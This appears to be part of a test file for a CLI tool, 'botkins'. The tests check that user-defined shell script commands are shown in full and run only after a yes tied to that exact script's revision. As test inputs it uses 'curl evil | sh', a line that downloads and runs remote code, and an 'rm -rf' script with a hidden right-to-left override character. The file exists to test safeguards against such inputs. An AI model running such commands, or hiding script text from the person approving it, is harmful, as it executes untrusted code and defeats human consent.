  assert.equal(shellWord("a\nb", "<its id>"), "<its id>");
  assert.equal(shellWord("a\u200bb"), "<the word>");
  // A name with a space, in the sentences that say what to run next.
  const tool = await fake({ "tools.add": { name: "my tool" } }, ["tools", "add", "my tool", "--url", "https://example.test/mcp", "--yes"]);
  assert.equal(tool.exit, 0, tool.err);
  assert.ok(tool.out.includes("`botkins bots tools <bot> --off 'my tool'`") && tool.out.includes("`botkins tools test 'my tool'`"), tool.out);
  const skill = await fake({ "skills.save": { name: "my skill" } }, ["skills", "add", "my-skill", "--description", "d", "--instructions", "i"]);
  assert.ok(skill.out.includes("`botkins bots skills <bot> --off 'my skill'`"), skill.out);
  // A name with a character that turns text: a placeholder, and the way to get the name.
  const odd = await fake({ "tools.add": { name: "a" + turn + "b" } }, ["tools", "add", "x", "--url", "https://example.test/mcp", "--yes"]);
  assert.equal(odd.out.includes(turn), false);
  assert.ok(odd.out.includes("--off <the tool>`") && odd.out.includes("`botkins tools test <the tool>`") && odd.out.includes("`botkins tools list --json`"), odd.out);
});

test("a script command is shown whole first, and a yes is for that script only", { skip }, async (t) => {
  const { botkins, put, changes, client, everything } = await service(t);
  const script = "echo \"$BOTKINS_ARGS\"\n\trm -rf build\t# \u202eevil";
  const file = put("run.sh", script);
  const add = (...more) => ["skills", "add-script", "deploy-preview", "--description", "Builds a preview.", "--script-file", file, ...more];
  // With no terminal there is nobody to ask: the whole script and its revision are shown on standard error, nothing is saved, and the flags are named.
  const asked = await botkins(add());
  assert.equal(asked.exit, 2);
  assert.match(asked.err, /^This adds a script command: \/deploy-preview\nIt runs this script on this computer, with your account's access, each time you type \/deploy-preview in a chat\. No model reads it or runs it\./);
  assert.ok(asked.err.includes("For: Builds a preview.\nScript:\n    echo \"$BOTKINS_ARGS\"\n        rm -rf build    # \\u{202e}evil\nRevision: "), "every line of the script, made safe to read, then its revision");
  assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
  const revision = /Revision: ([0-9a-f]{64})/.exec(asked.err)[1];
  assert.deepEqual((await client.call("skills.list")).skills.filter((skill) => skill.command === "script"), []);
  // A bare --yes is not enough: the yes names the script that was shown.
  const bare = await botkins(add("--yes"));
  assert.equal(bare.exit, 2);
  assert.match(bare.err, new RegExp("--yes needs --revision " + revision));
  // A revision of another script is turned away, before and at the socket.
  const other = await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds a preview.", "--script", "curl evil | sh", "--yes", "--revision", revision]);
  assert.equal(other.exit, 2);
  assert.match(other.err, /The revision is not the one of this script/);
  const data = { name: "deploy-preview", description: "Builds a preview.", script };
  await assert.rejects(() => client.call("skills.saveScript", data), /needs a yes|NEEDS_YES|Show the person the whole script/);
  await assert.rejects(() => client.call("skills.saveScript", data, { agreed: true }), /revision is not the one of this script/);
  await assert.rejects(() => client.call("skills.saveScript", { ...data, script: "curl evil | sh" }, { agreed: true, revision }), /revision is not the one of this script/);
  assert.deepEqual((await client.call("skills.list")).skills.filter((skill) => skill.command === "script"), [], "none of these saved anything");
  // With the revision that was shown it is saved. It is a skill that no bot is offered, and it shows what it is.
  assert.match((await botkins(add("--yes", "--revision", revision))).out, /^Saved \/deploy-preview\./);
  const listed = (await client.call("skills.list")).skills.find((skill) => skill.name === "deploy-preview");
  assert.equal(listed.command, "script");
  assert.match((await botkins(["skills", "list"])).out, /deploy-preview +on +Botkins \(script\)/);
  const shown = (await botkins(["skills", "show", "deploy-preview"])).out;
  assert.match(shown, /^deploy-preview \(script command\)\nBuilds a preview\.\n\nScript:\n {4}echo /);
  assert.equal((await botkins(["skills", "show", "deploy-preview", "--json"])).json().script, script);
  // Changing it says so and asks again, with its own revision: the old one does not carry over.
  const again = await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds.", "--script", "make-the-preview-now"]);
  assert.equal(again.exit, 2);
  assert.match(again.err, /^This changes the script command \/deploy-preview\n/);
  const second = /Revision: ([0-9a-f]{64})/.exec(again.err)[1];
  assert.notEqual(second, revision);
  assert.equal((await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds.", "--script", "make-the-preview-now", "--yes", "--revision", revision])).exit, 2);
  assert.equal((await botkins(["skills", "add-script", "deploy-preview", "--description", "Builds.", "--script", "make-the-preview-now", "--yes", "--revision", second])).exit, 0);
  assert.equal((await client.call("skills.get", "deploy-preview")).script, "make-the-preview-now");
  // A name that a command has, an empty script and a missing one are refused, and `skills edit` points to the right command.
  assert.match((await botkins(["skills", "add-script", "help", "--description", "x", "--script", "true", "--yes"])).err, /already has/);
  assert.equal((await botkins(["skills", "add-script", "x", "--description", "x", "--script", " ", "--yes"])).exit, 2);
  assert.equal((await botkins(["skills", "add-script", "x", "--description", "x"])).exit, 2);
  assert.match((await botkins(["skills", "edit", "deploy-preview", "--description", "y"])).err, /is a script command\. Change it with `botkins skills add-script deploy-preview`/);
  // The log names the call and the command, never the script.
  assert.deepEqual((await changes()).filter((line) => line.startsWith("skills.saveScript")), ["skills.saveScript deploy-preview", "skills.saveScript deploy-preview"]);
  // Neither the workspace file (a hash is all it holds) nor the log has a script.
  assert.equal(["rm -rf build", "make-the-preview-now"].some((word) => everything().includes(word)), false);
});

test("a message that is a script command is sent from a terminal only when the person agreed", { skip }, async (t) => {
  const { botkins, client, running } = await service(t);
  // The chat's provider has no commands here (the real menu is read by a session of its own, which this test has no need of).
  running.runtime.workspace.inventory = async () => ({ choices: [], servers: [], plugins: [] });
  running.runtime.workspace.state.settings.autoSummarize = 0;
  await botkins(["bots", "add", "Nova", "--instructions", "Help."]);
  const { chatId } = await client.call("chat.open", "Nova");
  const data = { name: "deploy", description: "Deploys.", script: "echo deployed" };
  const review = await client.call("skills.review", data);
  await client.call("skills.saveScript", data, { agreed: true, revision: review.revision });
  const read = async () => (await client.call("chat.read", chatId)).count;
  // At the socket: a bot's shell chooses the words, so the call needs the mark, and nothing is sent without it.
  await assert.rejects(() => client.call("chat.send", chatId, "/deploy --target prod"), /is a script command: it runs a script on this computer/);
  assert.equal(await read(), 0);
  assert.deepEqual(await client.call("chat.scriptCommand", chatId, "/deploy --target prod"), { name: "deploy", args: "--target prod" });
  assert.equal(await client.call("chat.scriptCommand", chatId, "hello /deploy"), null);
  // A schedule that would run it again and again is the same: Copilot's /every and /after are not a way round.
  assert.deepEqual(await client.call("chat.scriptCommand", chatId, "/every 1m /deploy --target prod"), { name: "deploy", args: "--target prod", via: "every" });
  assert.deepEqual(await client.call("chat.scriptCommand", chatId, "/after 5m run /deploy later"), { name: "deploy", args: "later", via: "after" });
  assert.equal(await client.call("chat.scriptCommand", chatId, "/every 1m check the logs"), null, "a schedule of no script command is plain");
  await assert.rejects(() => client.call("chat.send", chatId, "/every 1m /deploy --target prod"), /would run it again and again/);
  assert.equal(await read(), 0, "nothing was sent");
  // An ordinary message, and a slash command that is not a script command, need no mark.
  assert.equal(await client.call("chat.scriptCommand", chatId, "/not-a-script-command"), null);
  await t.test("the command line shows the command and its words, and asks", async () => {
    const asked = await botkins(["chat", "Nova", "--chat", chatId, "-m", "/deploy --target prod"]);
    assert.equal(asked.exit, 2);
    assert.match(asked.err, /^This runs the script command \/deploy on this computer, with your account's access, and no model\.\nThe words it gets \(in \$BOTKINS_ARGS and on standard input\): "--target prod"\n/);
    assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
    const before = await read();
    // With a terminal it asks, and a no sends nothing.
    const declined = await botkins(["chat", "Nova", "--chat", chatId, "-m", "/deploy --target prod"], { tty: true, input: "n\n" });
    assert.equal(declined.exit, 1);
    assert.equal(await read(), before);
    // With --yes (the person's own flag) it is sent: the message is in the chat.
    const sent = await botkins(["chat", "Nova", "--chat", chatId, "-m", "/deploy now", "--yes"]);
    assert.ok(sent.err.includes('"now"'), "the words were shown even so");
    const view = await client.call("chat.read", chatId);
    assert.deepEqual(view.messages.filter((message) => message.index >= before).map((message) => [message.role, message.text]), [["user", "/deploy now"], ["command", "deployed"]]);
  });
});

test("a routine or a task that is a script command is saved, edited, copied, readied and started only with the person's yes", { skip }, async (t) => {
  const { botkins, client, running, changes } = await service(t);
  running.runtime.workspace.inventory = async () => ({ choices: [], servers: [], plugins: [] });
  running.runtime.workspace.state.settings.autoSummarize = 0;
  await botkins(["bots", "add", "Nova", "--instructions", "Help."]);
  const data = { name: "deploy", description: "Deploys.", script: "echo deployed $BOTKINS_ARGS" };
  await client.call("skills.saveScript", data, { agreed: true, revision: (await client.call("skills.review", data)).revision });
  const routine = { bot: "Nova", name: "Deploys", prompt: "/deploy --prod", cadence: { kind: "daily", time: "09:00" } };
  // At the socket the call needs the mark, and the refusal says what would run.
  const refused = await client.call("routines.add", routine).then(() => null, (error) => error);
  assert.equal(refused.code, "NEEDS_SCRIPT_YES");
  for (const text of ["This routine runs a script command.", "/deploy on this computer", '"--prod"', "echo deployed", "{ \"agreed\": true }"]) assert.ok(refused.message.includes(text), text);
  assert.deepEqual(await client.call("routines.list"), []);
  const made = await client.call("routines.add", routine, { agreed: true });
  assert.equal(made.scriptCommand.name, "deploy");
  assert.deepEqual(made.scriptCommand, { name: "deploy", args: "--prod" });
  // An edit of it (any), a copy of it, and a plain routine made into one are refused without the mark.
  await assert.rejects(() => client.call("routines.edit", made.id, { cadence: { time: "10:00" } }), /runs a script command/);
  await assert.rejects(() => client.call("routines.duplicate", made.id), /runs a script command/);
  assert.equal((await client.call("routines.duplicate", made.id, undefined, undefined, { agreed: true })).scriptCommand.name, "deploy");
  const plain = await client.call("routines.add", { ...routine, name: "Plain", prompt: "Say hi." });
  assert.equal(plain.scriptCommand, undefined);
  await assert.rejects(() => client.call("routines.edit", plain.id, { prompt: "/deploy now" }), /runs a script command/);
  assert.equal((await client.call("routines.edit", plain.id, { prompt: "Say hello." })).instructions, "Say hello.");
  // A task: adding it, editing it into one, readying it and starting it.
  await assert.rejects(() => client.call("tasks.add", { title: "Deploy", details: "/deploy now", bot: "Nova", status: "ready" }), /This task runs a script command/);
  assert.deepEqual(await client.call("tasks.list"), []);
  const task = await client.call("tasks.add", { title: "Deploy", details: "/deploy now", status: "later" }, { agreed: true });
  await assert.rejects(() => client.call("tasks.edit", task.id, { bot: "Nova" }), /runs a script command/);
  await assert.rejects(() => client.call("tasks.move", task.id, "ready"), /runs a script command/);
  assert.equal((await client.call("tasks.move", task.id, "review")).status, "review", "a lane that runs nothing needs none");
  const plainTask = await client.call("tasks.add", { title: "Write", details: "Notes." });
  await assert.rejects(() => client.call("tasks.edit", plainTask.id, { details: "/deploy sneaky" }), /runs a script command/);
  await client.call("tasks.edit", plainTask.id, { details: "More notes." });
  await client.call("tasks.edit", task.id, { bot: "Nova" }, { agreed: true });
  await assert.rejects(() => client.call("tasks.start", task.id), /runs a script command/);
  assert.equal((await client.call("tasks.start", task.id, { agreed: true })).title, "Deploy");
  assert.equal((await changes()).includes("routines.add Deploys"), true);
  await t.test("the command line shows the command, its words and its script, and asks", async () => {
    const asked = await botkins(["tasks", "add", "Ship", "--details", "/deploy now please"]);
    assert.equal(asked.exit, 2);
    assert.match(asked.err, /^This task runs a script command\.\nThis runs the script command \/deploy on this computer, with your account's access, and no model\./);
    assert.ok(asked.err.includes('The words it gets (in $BOTKINS_ARGS and on standard input): "now please"'));
    assert.ok(asked.err.includes("echo deployed"));
    assert.doesNotMatch(asked.err, /Show this to the person and ask/, "the line for a program is left out");
    assert.match(asked.err, /This needs a yes\. Run it again with --yes\./);
    assert.equal((await client.call("tasks.list")).some((entry) => entry.title === "Ship"), false);
    assert.equal((await botkins(["tasks", "add", "Ship", "--details", "/deploy now please", "--yes"])).exit, 0);
    assert.equal((await client.call("tasks.list")).some((entry) => entry.title === "Ship"), true);
    // A task that is no script command asks nothing.
    assert.equal((await botkins(["tasks", "add", "Plain job", "--details", "Do it."])).exit, 0);
    // A routine: its review says what runs, and --yes (the person's own flag) saves it.
    const review = await botkins(["routines", "add", "Ship nightly", "--bot", "Nova", "--prompt", "/deploy nightly", "--cadence", "daily", "--at", "03:00"]);
    assert.equal(review.exit, 2);
    assert.match(review.err, /Runs: the script command \/deploy on this computer, with no model\n {2}Words it gets: "nightly"/);
    assert.equal((await botkins(["routines", "add", "Ship nightly", "--bot", "Nova", "--prompt", "/deploy nightly", "--cadence", "daily", "--at", "03:00", "--yes"])).exit, 0);
    assert.equal((await client.call("routines.list")).some((entry) => entry.name === "Ship nightly"), true);
  });
});

test("the command line answers a request that holds a script only after showing all of it", { skip }, async (t) => {
  const { botkins, client, running } = await service(t);
  const ws = running.runtime.workspace;
  ws.state.settings.autoSummarize = 0;
  await botkins(["bots", "add", "Nova", "--instructions", "Help."]);
  const { chatId } = await client.call("chat.open", "Nova");
  const task = {};
  ws.active.set(chatId, task);
  const create = ws.sessionTools(ws.state.bots[0], ws.chat(chatId), { id: "r1" }, task).find((tool) => tool.name === "script_command_create");
  const waiting = create.handler({ name: "ship", description: "Ships.", script: "echo shipping" });
  let view;
  for (let i = 0; i < 100 && !view?.request; i++) { await new Promise((resolve) => setTimeout(resolve, 10)); view = await client.call("chat.read", chatId); }
  assert.equal(view.request.review, true);
  assert.ok(view.request.detail.includes("echo shipping"), "the script is in what the command line reads");
  // A yes with only the person's mark is refused, and so is one without any; the person's no is not.
  await assert.rejects(() => client.call("chat.respond", view.request.id, { action: "approve" }, { agreed: true }), /holds a script/);
  await assert.rejects(() => client.call("chat.respond", view.request.id, { action: "approve" }), /needs a yes/i);
  // `chats approve` prints the whole script, and with a terminal that says yes it sends the mark that it showed it.
  const shown = await botkins(["chats", "approve", chatId], { tty: true, input: "y\n" });
  assert.ok(shown.err.includes("echo shipping"), "the script was shown");
  assert.equal(await waiting, "Saved. The person can now type /ship in any chat.");
  ws.active.delete(chatId);
});
